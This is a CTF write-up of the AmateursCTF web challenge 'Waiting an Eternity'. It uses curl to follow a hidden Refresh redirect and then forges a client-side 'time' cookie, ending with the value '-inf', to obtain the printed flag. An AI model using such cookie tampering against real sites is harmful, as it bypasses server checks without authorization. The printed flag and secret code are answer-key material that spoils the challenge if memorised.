---
title: "Waiting an Eternity"
tags:
- AmateursCTF
- CTF
- Cookies
- Web
date: 2023-07-19T07:53:17+05:30
draft: false
---

This was a fairly straightforward and fun challenge that required a bit of common sense to solve.
We are given the URL https://waiting-an-eternity.amt.rs to begin with.

Let's use `curl` with its verbose flag to fetch this URL.

```sh
curl -v "https://waiting-an-eternity.amt.rs"
```

We get a response that tells us to wait an enternity.

```
> GET / HTTP/2
> Host: waiting-an-eternity.amt.rs
> User-Agent: curl/8.1.1
> Accept: */*
> 
< HTTP/2 200 
< content-type: text/html; charset=utf-8
< date: Tue, 18 Jul 2023 04:28:52 GMT
< refresh: 1000000000000000000000000000000000000000000000000000000000000000000000000000000000000000; url=/secret-site?secretcode=5770011ff65738feaf0c1d009caffb035651bb8a7e16799a433a301c0756003a
< server: gunicorn
< content-length: 21
< 
* Connection #0 to host waiting-an-eternity.amt.rs left intact
just wait an eternity
```

On closer inspection, the refresh header with the gigantic number sticks out like a sore thumb.

```
refresh: 1000000000000000000000000000000000000000000000000000000000000000000000000000000000000000; url=/secret-site?secretcode=5770011ff65738feaf0c1d009caffb035651bb8a7e16799a433a301c0756003a
```

The refresh header is a non-standard but widely supported HTTP header that redirects to the URL present in the `url` field
after the specified timout in seconds.

In our case, this means that after one octovigintillion seconds, we would finally get redirected to `/secret-site?secretcode=5770011ff65738feaf0c1d009caffb035651bb8a7e16799a433a301c0756003a`.

Since I'm rather impatient, I'll proceed to visiting the redirect location. We will use the same technique as earlier, fetch the URL
using `curl` in its verbose settings.

```sh
curl -v "https://waiting-an-eternity.amt.rs/secret-site?secretcode=5770011ff65738feaf0c1d009caffb035651bb8a7e16799a433a301c0756003a"
```

This results in another slightly different response that tells us to wait another eternity.

```
> GET /secretsite?secretcode=5770011ff65738feaf0c1d009caffb035651bb8a7e16799a433a301c0756003a HTTP/2
> Host: waiting-an-eternity.amt.rs
> User-Agent: curl/8.1.1
> Accept: */*
> 
< HTTP/2 200 
< content-type: text/html; charset=utf-8
< date: Tue, 18 Jul 2023 04:44:02 GMT
< server: gunicorn
< set-cookie: time=1689655442.2456439; Path=/
< content-length: 38
< 
* Connection #0 to host waiting-an-eternity.amt.rs left intact
welcome. please wait another eternity.
```

There is another difference in the headers of the response. This time, instead of the `refresh` header, we can notice a `set-cookie` header
with the `time` cookie set to a floating point number.

```
set-cookie: time=1689655442.2456439; path=/
```

Let's try setting this `time` cookie to 0 using the `-b` flag with `curl`.

```sh
curl "https://waiting-an-eternity.amt.rs/secret-site?secretcode=5770011ff65738feaf0c1d009caffb035651bb8a7e16799a433a301c0756003a" \
-b "time=0"
```

The response tells us that we haven't waited enough.

```
you have not waited an eternity. you have only waited 1689655538.27981 seconds
```

This is better than the previous message as the server thinks we have at least waited some time. Since 0 is less than the default value
1689655442.2456439 we encountered before, let's try supplying an even smaller number like -1000.

```sh
curl "https://waiting-an-eternity.amt.rs/secret-site?secretcode=5770011ff65738feaf0c1d009caffb035651bb8a7e16799a433a301c0756003a" \
-b "time=-1000"
```

The response says:

```
you have not waited an eternity. you have only waited 1689657530.625615 seconds
```

Notice how 1689657530.625615 in the second response is greater than 1689655538.27981 from the first response.
This implies, for smaller values supplied to the `time` cookie, the time we have waited increases.

The last piece to the puzzle is that the `time` cookie is a floating point number. According to the IEE 754 floating
point specifications, these numbers must also be able to represent signed zeros, things that are not a number (NaN) and
*signed infinities*. To wait an eternity, we can supply the most negative value possible, `-inf`.

```sh
curl "https://waiting-an-eternity.amt.rs/secret-site?secretcode=5770011ff65738feaf0c1d009caffb035651bb8a7e16799a433a301c0756003a" \
-b "time=-inf"
```

This finally gives us our flag.

```
amateursCTF{im_g0iNg_2_s13Ep_foR_a_looo0ooO0oOooooOng_t1M3}
```